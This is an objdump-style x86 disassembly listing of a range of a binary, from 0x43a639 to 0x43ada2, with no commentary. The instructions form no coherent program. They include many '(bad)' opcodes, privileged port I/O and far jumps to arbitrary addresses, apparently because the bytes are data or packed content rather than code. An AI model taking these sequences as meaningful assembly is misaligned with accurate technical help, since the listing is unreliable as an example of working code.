  43a639:	dec    ebx
  43a63a:	div    cl
  43a63c:	add    BYTE PTR [ebx],0xb4
  43a63f:	push   edx
  43a640:	push   ebp
  43a641:	icebp  
  43a642:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a643:	mov    dl,0x9e
  43a645:	inc    edx
  43a646:	mov    al,0xe
  43a648:	mov    DWORD PTR [ecx-0x5f],ebp
  43a64b:	add    BYTE PTR [esi-0x43],ah
  43a64e:	test   eax,0x1005a886
  43a653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a654:	dec    eax
  43a655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a656:	ins    BYTE PTR es:[edi],dx
  43a657:	push   ebp
  43a658:	iret   
  43a659:	jmp    0x43a6c1
  43a65b:	(bad)  
  43a65c:	clc    
  43a65d:	pop    ebx
  43a65e:	add    al,0xb6
  43a660:	pop    ds
  43a661:	mov    dl,0xe0
  43a663:	sti    
  43a664:	push   ds
  43a665:	add    DWORD PTR [eax+0x7a633ada],ebp
  43a66b:	test   al,0x3c
  43a66d:	retf   0x5670
  43a670:	jns    0x43a6ec
  43a672:	pop    ds
  43a673:	pop    ecx
  43a674:	mov    al,ds:0x5ddd56f0
  43a679:	(bad)  
  43a67a:	ret    
  43a67b:	icebp  
  43a67c:	push   ebp
  43a67d:	add    ebp,DWORD PTR [edx-0x7ecdabaf]
  43a683:	popf   
  43a684:	loope  0x43a6e1
  43a686:	or     al,0x22
  43a688:	mov    DWORD PTR [edi+0x59],esp
  43a68b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a68c:	mov    esi,0xfeb4f503
  43a691:	add    eax,0x920d4a5e
  43a696:	jl     0x43a69f
  43a698:	in     al,dx
  43a699:	rcl    DWORD PTR [ecx],1
  43a69b:	mov    DWORD PTR cs:[edi-0x3ac5239],ebx
  43a6a2:	xor    ah,BYTE PTR [eax]
  43a6a4:	inc    ebx
  43a6a5:	add    esi,DWORD PTR [ebx+ebx*4+0x6fde999f]
  43a6ac:	(bad)  
  43a6ad:	js     0x43a6cd
  43a6af:	or     DWORD PTR [esp+esi*2-0x3f364829],0xb16f70f
  43a6ba:	sar    BYTE PTR [eax+0x6a7cfc50],1
  43a6c0:	mov    esi,ebp
  43a6c2:	add    ch,BYTE PTR [ecx-0x64e05c36]
  43a6c8:	dec    eax
  43a6c9:	mov    dh,0xce
  43a6cb:	pop    ecx
  43a6cc:	out    0x90,al
  43a6ce:	sub    bh,dl
  43a6d0:	dec    ecx
  43a6d1:	or     DWORD PTR [esi+0x7],0x12
  43a6d5:	or     DWORD PTR [ebx+0x2fcb7519],edi
  43a6db:	retf   
  43a6dc:	mov    BYTE PTR [edi+0x2],ch
  43a6df:	es jle 0x43a71f
  43a6e2:	mov    ebp,0x41cad4de
  43a6e7:	or     bh,al
  43a6e9:	fistp  WORD PTR [edi]
  43a6eb:	sub    DWORD PTR ds:0xd21ad175,edx
  43a6f1:	inc    edx
  43a6f2:	add    ch,BYTE PTR [eax+0x179d7989]
  43a6f8:	xchg   esp,eax
  43a6f9:	dec    ebx
  43a6fa:	sbb    BYTE PTR [ebx+ecx*8-0x395785b7],ch
  43a701:	add    BYTE PTR [ecx+0x55079ffb],0x65
  43a708:	mov    BYTE PTR ds:0x70167b62,dl
  43a70e:	retf   
  43a70f:	xor    eax,DWORD PTR [edx+0x0]
  43a712:	push   cs
  43a713:	jecxz  0x43a6aa
  43a715:	sahf   
  43a716:	push   eax
  43a717:	cmp    eax,0x54d8bae1
  43a71c:	inc    eax
  43a71d:	retf   
  43a71e:	imul   esi,ecx,0x5ce7da97
  43a724:	jge    0x43a6a9
  43a726:	add    al,0x2a
  43a728:	in     al,0xc2
  43a72a:	pusha  
  43a72b:	iret   
  43a72c:	jg     0x43a720
  43a72e:	ins    BYTE PTR es:[edi],dx
  43a72f:	xor    dh,bh
  43a731:	jmp    0xf31e6873
  43a736:	mov    bh,0xd5
  43a738:	mov    edx,0x4f22386c
  43a73d:	sti    
  43a73e:	mov    BYTE PTR [eax],0x89
  43a741:	rcl    DWORD PTR [ebp-0x36d98d42],0xe2
  43a748:	jns    0x43a724
  43a74a:	mov    dl,0x41
  43a74c:	call   0x7a99c5a0
  43a751:	jp     0x43a7ae
  43a753:	mov    cl,0x73
  43a755:	lahf   
  43a756:	pusha  
  43a757:	retf   
  43a758:	sbb    eax,0x56e427f6
  43a75d:	ror    BYTE PTR [edx],cl
  43a75f:	aam    0x33
  43a761:	outs   dx,DWORD PTR ds:[esi]
  43a762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a763:	cmp    ch,bl
  43a765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a766:	lds    ebp,FWORD PTR [edx+0x42c14f87]
  43a76c:	sbb    DWORD PTR ds:0x6fbe96ff,0x34d2d4f5
  43a776:	imul   esp,DWORD PTR [ebp-0x2a],0xffffffff
  43a77a:	loope  0x43a73c
  43a77c:	mov    DWORD PTR [ebx-0x4d752ca2],esi
  43a782:	into   
  43a783:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a784:	lock cld 
  43a786:	imul   edx,esp,0x57
  43a789:	sub    esp,DWORD PTR [eax+0x18d2b607]
  43a78f:	sbb    dh,BYTE PTR [esi-0x45]
  43a792:	nop
  43a793:	mov    eax,0x74308989
  43a798:	outs   dx,DWORD PTR ds:[esi]
  43a799:	call   0x481d7783
  43a79e:	test   al,0x2b
  43a7a0:	mov    ds:0x1a521f87,al
  43a7a5:	xor    DWORD PTR [eax-0x17],edi
  43a7a8:	and    edi,DWORD PTR [ecx+0x1e]
  43a7ab:	aas    
  43a7ac:	std    
  43a7ad:	push   ebp
  43a7ae:	sub    edi,DWORD PTR [esp+ebp*1+0x1e]
  43a7b2:	std    
  43a7b3:	aam    0xa0
  43a7b5:	lock rol DWORD PTR [esi],0xe3
  43a7b9:	(bad)  
  43a7ba:	dec    esi
  43a7bb:	ror    DWORD PTR [ecx+0x4071d451],0x6f
  43a7c2:	iret   
  43a7c3:	push   0xfffffff0
  43a7c5:	gs mov ebx,0xd2e333b8
  43a7cb:	ds mov ecx,esp
  43a7ce:	mov    edi,0x66f80ca5
  43a7d3:	cdq    
  43a7d4:	int    0xd3
  43a7d6:	or     DWORD PTR [edi],0x9e1f3885
  43a7dc:	or     BYTE PTR [eax-0x4e],al
  43a7df:	ror    BYTE PTR [ebp-0x3ab8cb2a],cl
  43a7e5:	mov    bh,0x50
  43a7e7:	ret    0xca9f
  43a7ea:	pusha  
  43a7eb:	jno    0x43a851
  43a7ed:	add    eax,0xbe82ecfb
  43a7f2:	paddq  mm2,mm1
  43a7f5:	lahf   
  43a7f6:	ror    ch,1
  43a7f8:	pop    ebp
  43a7f9:	cmp    ebx,DWORD PTR [edx+0xe]
  43a7fc:	sti    
  43a7fd:	pop    ebp
  43a7fe:	cmp    eax,0x1f9c036b
  43a803:	stos   DWORD PTR es:[edi],eax
  43a804:	loope  0x43a7db
  43a806:	mov    ecx,0x38059bf3
  43a80b:	xchg   ebp,eax
  43a80c:	lods   al,BYTE PTR ds:[esi]
  43a80d:	cs stos DWORD PTR es:[edi],eax
  43a80f:	and    DWORD PTR [esi+ebx*8-0x6ba456e1],edx
  43a816:	mov    al,ds:0x7ff8e0ec
  43a81b:	aad    0xb0
  43a81d:	ss pop ebx
  43a81f:	shr    BYTE PTR [edx-0x6bf50575],0x3
  43a826:	xchg   esi,eax
  43a827:	push   esp
  43a828:	(bad)  
  43a829:	aam    0xc9
  43a82b:	sub    ah,BYTE PTR [ebx+0x1b]
  43a82e:	pop    ds
  43a82f:	jo     0x43a83f
  43a831:	jl     0x43a8b2
  43a833:	aad    0xd7
  43a835:	icebp  
  43a836:	cld    
  43a837:	inc    esp
  43a838:	jg     0x43a8a1
  43a83a:	(bad)  
  43a83b:	cld    
  43a83c:	mov    cs,WORD PTR [ecx-0x4a]
  43a83f:	lahf   
  43a840:	jge    0x43a808
  43a842:	push   0xdfc06e94
  43a847:	int3   
  43a848:	dec    esi
  43a849:	and    al,0xd0
  43a84b:	pop    esp
  43a84c:	xor    dh,bh
  43a84e:	lods   eax,DWORD PTR ds:[esi]
  43a84f:	test   DWORD PTR [eax+0x7b6f2c45],ebx
  43a855:	addr16 jl 0x43a847
  43a858:	out    dx,al
  43a859:	xchg   edi,eax
  43a85a:	adc    al,0xf8
  43a85c:	ds inc edx
  43a85e:	sbb    eax,0x432b1bcb
  43a863:	inc    ebx
  43a864:	sar    bl,0xf7
  43a867:	mov    eax,DWORD PTR [edi+0x2f4dfebd]
  43a86d:	bound  ebp,QWORD PTR [ebx+0x1fbdf96f]
  43a873:	sub    esp,DWORD PTR [eax+0x4ca6fee5]
  43a879:	push   ebp
  43a87a:	fmul   st,st(0)
  43a87c:	rol    DWORD PTR cs:[esp+eax*4+0x62],cl
  43a881:	adc    BYTE PTR [ebx+0x24],cl
  43a884:	nop
  43a885:	test   BYTE PTR [ebx+0x2f],bl
  43a888:	data16 jne 0x43a865
  43a88b:	std    
  43a88c:	xchg   esp,eax
  43a88d:	mov    bh,0xf8
  43a88f:	xchg   esp,eax
  43a890:	aaa    
  43a891:	pop    ecx
  43a892:	cdq    
  43a893:	retf   0x4974
  43a896:	mov    dh,0x13
  43a898:	icebp  
  43a899:	pop    ss
  43a89a:	pop    esi
  43a89b:	inc    edi
  43a89c:	pop    esp
  43a89d:	out    dx,eax
  43a89e:	enter  0xd8d4,0x3c
  43a8a2:	iret   
  43a8a3:	mov    eax,0x1510a786
  43a8a8:	mov    dl,0x1
  43a8aa:	inc    edx
  43a8ab:	and    BYTE PTR [eax+0x603878d],cl
  43a8b1:	add    esi,DWORD PTR [ebx-0xa24bf2a]
  43a8b7:	ficomp WORD PTR [ebx-0x13]
  43a8ba:	ds push ecx
  43a8bc:	cs test esp,ecx
  43a8bf:	xor    al,0x55
  43a8c1:	jecxz  0x43a8ce
  43a8c3:	mov    WORD PTR [eax+0x87e93df],cs
  43a8c9:	test   al,0xbc
  43a8cb:	sub    DWORD PTR [ebx+0x1],ebx
  43a8ce:	and    ah,BYTE PTR [ebx-0x523d7049]
  43a8d4:	or     al,BYTE PTR [eax+eiz*1]
  43a8d7:	adc    DWORD PTR ds:0x535f58a3,ebp
  43a8dd:	xor    DWORD PTR [esi],ebx
  43a8df:	push   ds
  43a8e0:	mov    bl,BYTE PTR ds:0x3519c4c
  43a8e6:	nop
  43a8e7:	cld    
  43a8e8:	pop    ds
  43a8e9:	mov    esp,0x22e8cbc
  43a8ee:	pop    ds
  43a8ef:	push   edi
  43a8f0:	mov    esp,0xf0ccd80d
  43a8f5:	call   0xf3de30b4
  43a8fa:	fwait
  43a8fb:	lds    ebp,FWORD PTR [esi-0x45]
  43a8fe:	fiadd  DWORD PTR [edi]
  43a900:	mov    es,WORD PTR [ecx+0x50]
  43a903:	jne    0x43a915
  43a905:	and    DWORD PTR [ebx],0x67
  43a908:	loop   0x43a903
  43a90a:	fmulp  st(5),st
  43a90c:	xor    BYTE PTR [edx],al
  43a90e:	lods   al,BYTE PTR ds:[esi]
  43a90f:	jae    0x43a95f
  43a911:	cs mov ebx,0x1e299a57
  43a917:	xor    eax,0x26b80715
  43a91c:	test   BYTE PTR [ebp-0x12],dl
  43a91f:	aad    0x33
  43a921:	retf   0x3208
  43a924:	or     al,0x33
  43a926:	in     eax,0xf0
  43a928:	mov    DWORD PTR [ebx-0x18],ebp
  43a92b:	or     bh,cl
  43a92d:	xchg   DWORD PTR [edx-0x6bfd7f00],edi
  43a933:	cwde   
  43a934:	std    
  43a935:	mov    edi,0x3460900
  43a93a:	pop    ds
  43a93b:	pop    edi
  43a93c:	nop
  43a93d:	neg    BYTE PTR [edi-0x46]
  43a940:	test   BYTE PTR [edi+0x599e569],al
  43a946:	mov    dl,0x54
  43a948:	pop    edi
  43a949:	sbb    bh,BYTE PTR [edx+0x628e496c]
  43a94f:	or     eax,0x5de820ba
  43a954:	adc    al,0x88
  43a956:	pop    edi
  43a957:	xchg   edi,eax
  43a958:	or     eax,0x8971698e
  43a95d:	in     eax,dx
  43a95e:	mov    ds:0x94dfb3c6,eax
  43a963:	add    BYTE PTR [ecx+0x66a1c07d],cl
  43a969:	retf   0xc0c9
  43a96c:	outs   dx,BYTE PTR ds:[esi]
  43a96d:	adc    BYTE PTR [edx-0x2f],bh
  43a970:	int3   
  43a971:	imul   eax,DWORD PTR [edi],0x838f9663
  43a977:	xchg   esp,eax
  43a978:	mov    cl,0xc6
  43a97a:	fsub   st(1),st
  43a97c:	adc    al,0x3
  43a97e:	dec    edx
  43a97f:	push   0x6b6bb76f
  43a984:	cmc    
  43a985:	mov    bl,0x60
  43a987:	mov    ch,0x63
  43a989:	shl    DWORD PTR [edx+edx*2-0x50],1
  43a98d:	fmulp  st(5),st
  43a98f:	shl    DWORD PTR [esi],cl
  43a991:	(bad)  
  43a993:	xor    bh,dh
  43a995:	mov    al,ds:0xdb52a890
  43a99a:	pop    ds
  43a99b:	xor    eax,0x61276183
  43a9a0:	add    BYTE PTR [edi+0x660cd7c6],0x34
  43a9a7:	in     al,0x47
  43a9a9:	push   edx
  43a9aa:	cmp    BYTE PTR [edi+0x63],dh
  43a9ad:	inc    ecx
  43a9ae:	push   ds
  43a9af:	mov    ebp,0xad63f004
  43a9b4:	add    ebx,DWORD PTR [ecx-0x38]
  43a9b7:	test   DWORD PTR [edx+0x44272618],edx
  43a9bd:	(bad)  
  43a9be:	xor    dl,BYTE PTR [edi+0x5a]
  43a9c1:	aad    0x57
  43a9c3:	outs   dx,DWORD PTR ds:[esi]
  43a9c4:	pusha  
  43a9c5:	cdq    
  43a9c6:	sbb    BYTE PTR [esp+ebx*2],dh
  43a9c9:	and    eax,0xa5694dde
  43a9ce:	mov    ecx,0x9405df6e
  43a9d3:	push   ecx
  43a9d4:	add    al,0x3d
  43a9d6:	jb     0x43a9c8
  43a9d8:	out    0x3,al
  43a9da:	pop    ds
  43a9db:	pop    ebx
  43a9dc:	mov    dl,ah
  43a9de:	sub    DWORD PTR [ebx-0x16],ecx
  43a9e1:	adc    eax,0xd46ad63c
  43a9e6:	jp     0x43a9fb
  43a9e8:	cmp    al,ch
  43a9ea:	(bad)  
  43a9eb:	or     al,0xc2
  43a9ed:	icebp  
  43a9ee:	xlat   BYTE PTR ds:[ebx]
  43a9ef:	inc    edi
  43a9f0:	jecxz  0x43a9f4
  43a9f2:	test   al,0xe0
  43a9f4:	adc    DWORD PTR [edx+0x5a2bae2],ebp
  43a9fa:	je     0x43a9d6
  43a9fc:	push   0x1288131
  43aa01:	or     eax,0x2d63993
  43aa06:	jl     0x43a9a9
  43aa08:	bound  ebp,QWORD PTR [ecx+0x5d6fb9a]
  43aa0e:	mov    esi,0x19377e36
  43aa13:	or     al,0xb
  43aa15:	pop    ebp
  43aa16:	sbb    DWORD PTR [esi],edi
  43aa18:	xchg   esp,eax
  43aa19:	pop    ecx
  43aa1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43aa1b:	dec    edi
  43aa1c:	repnz or ebx,DWORD PTR [edi-0x21cef11b]
  43aa23:	stc    
  43aa24:	pop    ebx
  43aa25:	add    dl,ah
  43aa27:	sahf   
  43aa28:	add    al,0x19
  43aa2a:	mov    bh,0xbe
  43aa2c:	(bad)  
  43aa2e:	pop    ds
  43aa2f:	(bad)  
  43aa31:	fucomi st,st(0)
  43aa33:	popf   
  43aa34:	retf   0x7b2b
  43aa37:	sar    edi,cl
  43aa39:	aaa    
  43aa3a:	fs jbe 0x43aab8
  43aa3d:	cmp    al,0xfe
  43aa3f:	in     al,0x17
  43aa41:	lods   eax,DWORD PTR ds:[esi]
  43aa42:	pusha  
  43aa43:	(bad)  
  43aa44:	hlt    
  43aa45:	and    eax,0x1308c880
  43aa4a:	jp     0x43aa21
  43aa4c:	call   0x58a2:0xd91948e7
  43aa53:	cmp    DWORD PTR [ebp+0x7f],esp
  43aa56:	sbb    bl,BYTE PTR ds:0x551f1cf9
  43aa5c:	vhsubps ymm5,ymm3,ymm5
  43aa60:	pop    ecx
  43aa61:	mov    bh,0x70
  43aa63:	ret    
  43aa64:	mov    edi,0xa0f6f41a
  43aa69:	fs sar al,cl
  43aa6c:	add    BYTE PTR [ebx-0x1f],bl
  43aa6f:	shl    BYTE PTR [eax+ecx*2-0x11],1
  43aa73:	in     al,dx
  43aa74:	pop    ebx
  43aa75:	add    dl,BYTE PTR [edx-0x39f72799]
  43aa7b:	ror    DWORD PTR [edx-0x40faa344],0x51
  43aa82:	pop    ds
  43aa83:	mov    ds:0x62d10a00,al
  43aa88:	aas    
  43aa89:	add    eax,ecx
  43aa8b:	es int3 
  43aa8d:	ss daa 
  43aa8f:	aaa    
  43aa90:	(bad)  
  43aa92:	mov    al,ds:0x3af58e23
  43aa97:	imul   esp,esp,0xffffffc0
  43aa9a:	mov    dh,0xf2
  43aa9c:	mov    esp,0x2521e115
  43aaa1:	data16 and BYTE PTR [eax+0x61],ch
  43aaa5:	add    BYTE PTR [eax-0x158c2bd0],ah
  43aaab:	lds    eax,FWORD PTR [ebp+0x7d5360db]
  43aab1:	sub    dl,dh
  43aab3:	das    
  43aab4:	adc    ch,BYTE PTR [eax]
  43aab6:	and    dl,ah
  43aab8:	out    dx,eax
  43aab9:	fisub  DWORD PTR [eax]
  43aabb:	mov    dh,0x11
  43aabd:	test   ecx,eax
  43aabf:	pushf  
  43aac0:	mov    ebp,edi
  43aac2:	out    0x3,eax
  43aac4:	xchg   DWORD PTR [edx],ebx
  43aac6:	in     eax,0x1d
  43aac8:	pop    ecx
  43aac9:	dec    eax
  43aaca:	push   cs
  43aacb:	rcr    al,1
  43aacd:	es or  dh,ah
  43aad0:	cs or  al,0x60
  43aad3:	sub    ebx,DWORD PTR [edx+0x22]
  43aad6:	pop    ss
  43aad7:	inc    edi
  43aad8:	and    BYTE PTR [ebx],al
  43aada:	fsubr  DWORD PTR [ebp+0x51]
  43aadd:	rcpps  xmm0,XMMWORD PTR [ebx+0xbde4644]
  43aae4:	xor    eax,0x8d56f7a3
  43aae9:	pop    ss
  43aaea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43aaeb:	ret    
  43aaec:	cmp    edi,ebp
  43aaee:	xchg   ebx,eax
  43aaef:	push   ebp
  43aaf0:	imul   esp,esp,0xffffffc0
  43aaf3:	push   ds
  43aaf4:	or     DWORD PTR [edi],eax
  43aaf6:	jne    0x43ab0c
  43aaf8:	les    eax,FWORD PTR [ebx]
  43aafa:	mov    bh,0xd4
  43aafc:	xchg   DWORD PTR [edi+esi*1-0x4a],edi
  43ab00:	and    BYTE PTR [eax*8+0x493b823f],bh
  43ab07:	fwait
  43ab08:	mov    ebx,0x91e2e0ed
  43ab0d:	sbb    BYTE PTR [ebp+ebx*1+0xd],cl
  43ab11:	pop    ds
  43ab12:	pop    ds
  43ab13:	pop    ecx
  43ab14:	loope  0x43aaf7
  43ab16:	aas    
  43ab17:	xor    bh,BYTE PTR [eax+0x2dbd6d09]
  43ab1d:	test   eax,0xcc8499cd
  43ab22:	addr16 aam 0x28
  43ab25:	arpl   WORD PTR [ebp-0x51],bp
  43ab28:	fist   WORD PTR [edi+ecx*2]
  43ab2b:	loope  0x43aabc
  43ab2d:	and    eax,0xc8ce242d
  43ab32:	inc    ebx
  43ab33:	add    al,0x2d
  43ab35:	test   dh,0x5f
  43ab38:	fwait
  43ab39:	hlt    
  43ab3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ab3b:	mov    esi,0xf5e0247
  43ab40:	ret    0x8f6a
  43ab43:	mov    ecx,DWORD PTR [ecx-0x43c4ba81]
  43ab49:	fisttp QWORD PTR [ebx+0x1336071]
  43ab4f:	xlat   BYTE PTR ds:[ebx]
  43ab50:	mov    ch,0xc8
  43ab52:	sbb    al,0x54
  43ab54:	retf   0x6c5e
  43ab57:	mov    al,0x88
  43ab59:	popf   
  43ab5a:	xlat   BYTE PTR ds:[ebx]
  43ab5b:	cmp    al,0xaf
  43ab5d:	sbb    al,0x8
  43ab5f:	sub    esp,DWORD PTR [esi]
  43ab61:	add    cl,BYTE PTR [eax-0xb]
  43ab64:	push   es
  43ab65:	sbb    edx,ebx
  43ab67:	mov    ds:0x151fd0c9,al
  43ab6c:	sbb    al,0x56
  43ab6e:	push   es
  43ab6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ab70:	or     al,0xc3
  43ab72:	push   ss
  43ab73:	xlat   BYTE PTR ds:[ebx]
  43ab74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ab75:	test   ebx,ecx
  43ab77:	out    dx,al
  43ab78:	mov    eax,0xb5de10dc
  43ab7d:	addr16 inc edx
  43ab7f:	dec    esi
  43ab80:	mov    esi,ebx
  43ab82:	pop    ss
  43ab83:	test   ebx,0x61c06c80
  43ab89:	add    ecx,DWORD PTR [esi-0x333bfe45]
  43ab8f:	lock icebp 
  43ab91:	(bad)  
  43ab92:	popa   
  43ab93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ab94:	mov    ebx,fs
  43ab96:	lahf   
  43ab97:	ins    BYTE PTR es:[edi],dx
  43ab98:	sahf   
  43ab99:	gs sahf 
  43ab9b:	pushf  
  43ab9c:	push   esp
  43ab9d:	add    ebp,edx
  43ab9f:	add    BYTE PTR [esi],al
  43aba1:	mov    ah,0xc1
  43aba3:	sub    eax,0xb31f1c56
  43aba8:	and    ebp,DWORD PTR [eax-0x6d]
  43abab:	xor    BYTE PTR [ebx+eax*2+0x551cab6e],dh
  43abb2:	jno    0x43ac23
  43abb4:	xchg   BYTE PTR [ebx+ebx*1+0x1b],dl
  43abb8:	or     BYTE PTR [ebx+0x3ee92c64],ah
  43abbe:	inc    esp
  43abbf:	imul   edx,DWORD PTR [edi],0x4a9360a0
  43abc5:	fcom   DWORD PTR [ecx-0xd8c3efd]
  43abcb:	call   0x2c1:0x502c7c9c
  43abd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43abd3:	lods   al,BYTE PTR ds:[esi]
  43abd4:	stos   DWORD PTR es:[edi],eax
  43abd5:	sbb    esp,esi
  43abd7:	inc    edi
  43abd8:	repnz test ecx,esi
  43abdb:	aad    0x65
  43abdd:	xchg   esp,eax
  43abde:	pop    ebp
  43abdf:	adc    BYTE PTR [esi],0x1
  43abe2:	(bad)  
  43abe3:	call   0x297a:0x556e5774
  43abea:	imul   edi,DWORD PTR [ebp+0x460e5feb],0xffffff89
  43abf1:	pop    ds
  43abf2:	es pushf 
  43abf4:	add    eax,0x1baf4fc9
  43abf9:	adc    eax,0xc3219882
  43abfe:	outs   dx,BYTE PTR ds:[esi]
  43abff:	icebp  
  43ac00:	xchg   edx,eax
  43ac01:	ds push ds
  43ac03:	cs xchg ecx,eax
  43ac05:	xor    al,0x3c
  43ac07:	aaa    
  43ac08:	mov    ebx,ebp
  43ac0a:	stos   DWORD PTR es:[edi],eax
  43ac0b:	int3   
  43ac0c:	dec    esp
  43ac0d:	pop    es
  43ac0e:	pop    ss
  43ac0f:	aas    
  43ac10:	clc    
  43ac11:	pop    ss
  43ac12:	pop    eax
  43ac13:	lods   eax,DWORD PTR ds:[esi]
  43ac14:	inc    edi
  43ac15:	push   ss
  43ac16:	loopne 0x43abec
  43ac18:	(bad)  
  43ac19:	addr16 dec esi
  43ac1b:	or     edi,DWORD PTR [ecx-0x6e]
  43ac1e:	pusha  
  43ac1f:	(bad)  
  43ac20:	cmp    al,0xd0
  43ac22:	nop
  43ac23:	sbb    al,0x2a
  43ac25:	xchg   esp,eax
  43ac26:	push   ecx
  43ac27:	aad    0x73
  43ac29:	jo     0x43ac82
  43ac2b:	not    ebx
  43ac2d:	sahf   
  43ac2e:	jmp    0xb518:0xc478720
  43ac35:	mov    ecx,0x3f52a6a0
  43ac3a:	popa   
  43ac3b:	aam    0xba
  43ac3d:	mov    eax,ds:0x7d0868e6
  43ac42:	sub    dl,al
  43ac44:	mov    BYTE PTR [ebp-0x25],dl
  43ac47:	xor    ecx,DWORD PTR [ebx-0x2b]
  43ac4a:	mov    esp,0x1202f1c7
  43ac4f:	sahf   
  43ac50:	cdq    
  43ac51:	fadd   st(1),st
  43ac53:	ja     0x43aca5
  43ac55:	ds dec esi
  43ac57:	add    BYTE PTR [esi+0x70d17deb],cl
  43ac5d:	pop    es
  43ac5e:	and    ah,cl
  43ac60:	leave  
  43ac61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ac62:	sbb    cl,ch
  43ac64:	mov    ecx,0x49f09e05
  43ac69:	enter  0x1eba,0x49
  43ac6d:	mov    bl,0x1f
  43ac6f:	xor    ecx,DWORD PTR [ebx]
  43ac71:	jb     0x43ac69
  43ac73:	jns    0x43ac64
  43ac75:	iret   
  43ac76:	loop   0x43ac56
  43ac78:	and    ah,dh
  43ac7a:	add    edx,esp
  43ac7c:	setae  BYTE PTR [edi-0x519a7f3a]
  43ac83:	push   ds
  43ac84:	(bad)  
  43ac85:	loope  0x43ac0b
  43ac87:	mov    eax,0x75ed1348
  43ac8c:	jecxz  0x43ace3
  43ac8e:	stos   BYTE PTR es:[edi],al
  43ac8f:	retf   
  43ac90:	add    al,0x1c
  43ac92:	xchg   edx,eax
  43ac93:	pop    eax
  43ac94:	retf   0x634e
  43ac97:	loope  0x43ace3
  43ac99:	mov    eax,ds:0xc061fd45
  43ac9e:	pusha  
  43ac9f:	xchg   ebp,eax
  43aca0:	xchg   edi,eax
  43aca1:	cwde   
  43aca2:	jmp    DWORD PTR [ebx-0x2a5f52be]
  43aca8:	out    0x21,eax
  43acaa:	or     al,0x7f
  43acac:	inc    edi
  43acad:	dec    edx
  43acae:	cmp    DWORD PTR [eax-0x78],eax
  43acb1:	jae    0x43ad2b
  43acb3:	das    
  43acb4:	add    BYTE PTR [ebp+edx*4-0x49e333a6],ch
  43acbb:	pop    esp
  43acbc:	imul   edx,DWORD PTR [ebp+0x7d48edcb],0xbe18cce3
  43acc6:	add    BYTE PTR [ebp+0x67c773ea],ch
  43accc:	lea    edx,[ebp+0x2e5419e]
  43acd2:	adc    dh,ch
  43acd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43acd5:	inc    ecx
  43acd6:	outs   dx,BYTE PTR ds:[esi]
  43acd7:	xor    dl,BYTE PTR [esi]
  43acd9:	in     eax,dx
  43acda:	pusha  
  43acdb:	xchg   ebx,eax
  43acdc:	icebp  
  43acdd:	push   edx
  43acde:	and    cl,BYTE PTR [esi+edi*8-0x4e]
  43ace2:	test   eax,0xc80373f0
  43ace7:	stos   DWORD PTR es:[edi],eax
  43ace8:	sub    BYTE PTR [edx-0x93ffd1a],bl
  43acee:	pop    ds
  43acef:	das    
  43acf0:	(bad)  
  43acf1:	mov    cs,WORD PTR [eax-0x2713b511]
  43acf7:	aam    0x3c
  43acf9:	inc    edi
  43acfa:	mov    ch,0xb2
  43acfc:	or     DWORD PTR [esi],esi
  43acfe:	inc    esi
  43acff:	into   
  43ad00:	je     0x43ac92
  43ad02:	lock test eax,0x42661c41
  43ad08:	mov    WORD PTR [edi-0x376a36e],ds
  43ad0e:	cs retf 
  43ad10:	fwait
  43ad11:	cld    
  43ad12:	test   eax,0xbc509e69
  43ad17:	rol    BYTE PTR [ebx+0x2882add7],cl
  43ad1d:	adc    esi,ebp
  43ad1f:	and    BYTE PTR [ecx+0x4d2f4dcd],cl
  43ad25:	out    0x8f,eax
  43ad27:	daa    
  43ad28:	xchg   edx,eax
  43ad29:	add    eax,0x9f433d5e
  43ad2e:	or     dh,dl
  43ad30:	sbb    DWORD PTR [edx],ebp
  43ad32:	pop    ds
  43ad33:	cmp    edx,DWORD PTR [edx-0x20]
  43ad36:	jp     0x43ad2a
  43ad38:	dec    esi
  43ad39:	in     al,0x44
  43ad3b:	leave  
  43ad3c:	aas    
  43ad3d:	sbb    al,bh
  43ad3f:	data16 jbe 0x43ad7a
  43ad42:	jo     0x43ad99
  43ad44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ad45:	stc    
  43ad46:	(bad)  [ebx-0x77]
  43ad49:	int    0xf8
  43ad4b:	in     eax,dx
  43ad4c:	stos   DWORD PTR es:[edi],eax
  43ad4d:	rol    DWORD PTR [edx+0x61420e4d],cl
  43ad53:	mov    ah,0xb6
  43ad55:	jb     0x43ad25
  43ad57:	mov    ds:0xd282ad88,eax
  43ad5c:	(bad)  
  43ad5d:	out    dx,al
  43ad5e:	mov    dh,0x57
  43ad60:	push   0xd3451f42
  43ad65:	or     DWORD PTR [ecx],eax
  43ad67:	out    dx,eax
  43ad68:	dec    edx
  43ad69:	pushf  
  43ad6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ad6b:	aad    0x22
  43ad6d:	cli    
  43ad6e:	mov    eax,0xefba7030
  43ad73:	cmp    DWORD PTR [eax-0x2ba21979],ecx
  43ad79:	sbb    DWORD PTR [esi-0x2f1cfdc4],ecx
  43ad7f:	aad    0xb6
  43ad81:	mov    DWORD PTR [edi],ebp
  43ad83:	xchg   edx,eax
  43ad84:	sub    al,0xd5
  43ad86:	adc    BYTE PTR [eax],cl
  43ad88:	mov    DWORD PTR [ecx+0x6b],esp
  43ad8b:	push   0x54
  43ad8d:	pop    ecx
  43ad8e:	shl    DWORD PTR [ebp-0x62],1
  43ad91:	clc    
  43ad92:	cmc    
  43ad93:	mov    edx,0x327e7ae3
  43ad98:	pop    ebx
  43ad99:	cmc    
  43ad9a:	fidivr DWORD PTR [eax-0x7f43e813]
  43ada0:	dec    eax
  43ada1:	(bad)  
  43ada2:	xchg   edi,eax
